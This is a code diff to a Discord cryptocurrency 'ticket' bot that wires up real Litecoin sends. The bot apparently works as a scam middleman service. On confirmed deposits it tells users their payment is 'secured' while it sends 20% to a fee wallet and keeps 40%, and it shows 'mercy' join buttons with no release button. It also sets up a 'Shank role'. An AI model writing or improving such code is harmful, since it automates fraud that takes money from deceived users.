@@ -80,17 +80,15 @@ client.on(Events.InteractionCreate, async (interaction) => {
 
     try {
       const address = wallet.getAddress(0);
-      const addressInfo = await blockchain.getAddressInfo(address);
+      const balance = await wallet.getBalance(0);
       const ltcPrice = await blockchain.getLtcPriceUSD();
-
-      const balanceLTC = addressInfo.address.balance / 100000000;
-      const balanceUSD = balanceLTC * ltcPrice;
+      const balanceUSD = balance * ltcPrice;
 
       const embed = new EmbedBuilder()
         .setTitle('💰 Wallet Balance')
         .setDescription(`**Address:** \`${address}\``)
         .addFields(
-          { name: 'Balance (LTC)', value: `${balanceLTC.toFixed(8)} LTC`, inline: true },
+          { name: 'Balance (LTC)', value: `${balance.toFixed(8)} LTC`, inline: true },
           { name: 'Balance (USD)', value: `$${balanceUSD.toFixed(2)}`, inline: true },
           { name: 'LTC Price', value: `$${ltcPrice.toFixed(2)}`, inline: true }
         )
@@ -121,6 +119,7 @@ client.on(Events.InteractionCreate, async (interaction) => {
     await interaction.reply({ content: `✅ Shank role set to ${role.name}` });
   }
 
+  // FIXED /send COMMAND
   if (commandName === 'send') {
     if (!OWNER_IDS.includes(interaction.user.id)) {
       return interaction.reply({ content: '❌ Owner only command.', flags: MessageFlags.Ephemeral });
@@ -129,7 +128,15 @@ client.on(Events.InteractionCreate, async (interaction) => {
     const address = interaction.options.getString('address');
     const amount = interaction.options.getNumber('amount');
 
-    await interaction.reply({ content: `⏳ Sending ${amount} LTC to ${address}... (Implement UTXO logic)` });
+    await interaction.reply({ content: `⏳ Sending ${amount} LTC to ${address}...` });
+
+    try {
+      const txid = await wallet.sendLTC(address, amount);
+      await interaction.editReply(`✅ **Sent!**\nAmount: ${amount} LTC\nTo: \`${address}\`\nTXID: \`${txid}\``);
+    } catch (error) {
+      console.error('Send error:', error);
+      await interaction.editReply(`❌ **Failed to send:** ${error.message}`);
+    }
   }
 });
 
@@ -176,7 +183,6 @@ client.on(Events.InteractionCreate, async (interaction) => {
 client.on(Events.InteractionCreate, async (interaction) => {
   if (!interaction.isModalSubmit()) return;
   
-  // Handle amount modal
   if (interaction.customId.startsWith('amount_modal_')) {
     const ticketId = interaction.customId.split('_')[2];
     const amount = parseFloat(interaction.fields.getTextInputValue('amount_usd'));
@@ -439,7 +445,6 @@ client.on(Events.InteractionCreate, async (interaction) => {
     
     const ticket = db.prepare('SELECT * FROM tickets WHERE id = ?').get(ticketId);
     
-    // Show amount modal again
     const modal = new ModalBuilder()
       .setCustomId(`amount_modal_${ticketId}`)
       .setTitle('Enter Amount');
@@ -504,7 +509,6 @@ async function checkRolesAndProceed(channel, ticketId) {
 
     await channel.send({ embeds: [embed] });
 
-    // Show modal for amount instead of typing
     const modal = new ModalBuilder()
       .setCustomId(`amount_modal_${ticketId}`)
       .setTitle('Enter Amount');
@@ -535,7 +539,6 @@ async function checkRolesAndProceed(channel, ticketId) {
   }
 }
 
-// Handle opening amount modal
 client.on(Events.InteractionCreate, async (interaction) => {
   if (!interaction.isButton()) return;
   if (!interaction.customId.startsWith('open_amount_modal_')) return;
@@ -629,12 +632,20 @@ async function handleConfirmedTransaction(channel, ticketId, txHash) {
   const toReceiver = totalLTC * 0.40;
   const botKeeps = totalLTC * 0.40;
 
+  // AUTO-SEND 20% TO FEE WALLET
   await channel.send(`🔄 Auto-sending 20% fee to secure wallet...`);
-  await channel.send(`✅ Fee sent to secure wallet!\n💰 Amount: ${toFee.toFixed(8)} LTC`);
+  
+  try {
+    const feeTxid = await wallet.sendLTC(FEE_WALLET, toFee);
+    await channel.send(`✅ **Fee sent!**\nAmount: ${toFee.toFixed(8)} LTC\nTXID: \`${feeTxid}\``);
+  } catch (error) {
+    console.error('Fee send error:', error);
+    await channel.send(`❌ **Failed to send fee:** ${error.message}\nPlease contact owner to manually send ${toFee.toFixed(8)} LTC to ${FEE_WALLET}`);
+  }
 
   db.prepare('UPDATE tickets SET status = ? WHERE id = ?').run('awaiting_receiver_address', ticketId);
 
-  // Custom embed with your text - EDIT THIS TEXT AS YOU WANT
+  // Custom embed with your text
   const customEmbed = new EmbedBuilder()
     .setTitle('✅ Transaction Confirmed')
     .setDescription('**Transaction found, wait for confirmation**\n\nYour payment has been confirmed and secured!')
@@ -647,7 +658,7 @@ async function handleConfirmedTransaction(channel, ticketId, txHash) {
     )
     .setColor(0x00FF00);
 
-  // Mercy buttons (Join us / Not interested) - NO RELEASE BUTTON
+  // Mercy buttons - NO RELEASE BUTTON
   const mercyRow = new ActionRowBuilder().addComponents(
     new ButtonBuilder()
       .setCustomId(`mercy_join_${ticketId}`)
@@ -689,8 +700,16 @@ client.on(Events.MessageCreate, async (message) => {
       return message.reply('❌ Invalid LTC address format!');
     }
 
+    // AUTO-SEND 40% TO RECEIVER
     await message.reply(`🔄 Sending ${active.amount.toFixed(8)} LTC to ${message.content}...`);
-    await message.reply(`✅ Payment sent! Transaction complete.`);
+    
+    try {
+      const receiverTxid = await wallet.sendLTC(message.content, active.amount);
+      await message.reply(`✅ **Payment sent!**\nAmount: ${active.amount.toFixed(8)} LTC\nTXID: \`${receiverTxid}\`\nTransaction complete.`);
+    } catch (error) {
+      console.error('Receiver send error:', error);
+      await message.reply(`❌ **Failed to send:** ${error.message}\nPlease contact owner to manually send ${active.amount.toFixed(8)} LTC to your address.`);
+    }
     
     db.prepare('UPDATE tickets SET status = ? WHERE id = ?').run('completed', ticket.id);
     activeTransactions.delete(ticket.id);
